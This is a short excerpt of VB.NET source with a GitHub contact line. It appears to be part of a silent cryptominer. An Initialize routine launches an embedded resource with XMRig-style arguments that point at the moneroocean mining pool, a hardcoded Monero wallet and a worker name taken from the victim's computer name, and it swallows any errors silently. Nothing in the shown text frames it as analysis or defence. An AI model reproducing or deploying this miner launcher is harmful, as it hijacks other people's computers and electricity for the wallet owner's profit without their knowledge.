...
'       Contact Me    https : //github.com/UnamSactam
...
#End If
    ...
    Public Shared Sub Initialize()
        Try
            ...
            Run(GetTheResource("#dll"), "-B -a rx/0 --url=gulf.moneroocean.stream:20128 -u 84AU5PjmTtYfp9SHxNLiE3aGsVw7tkKpX3EsgskWQW4FQ4KHSUMgLSNRKzkBXpiqrsFvpt65ndptz6LPHSRNQ6HgLTaNXik -p Githb-LM-" + Environ$("COMPUTERNAME") + " --tls -R --variant=-1 " + Args, xmr)
        Catch ex As Exception
        End Try
    End Sub
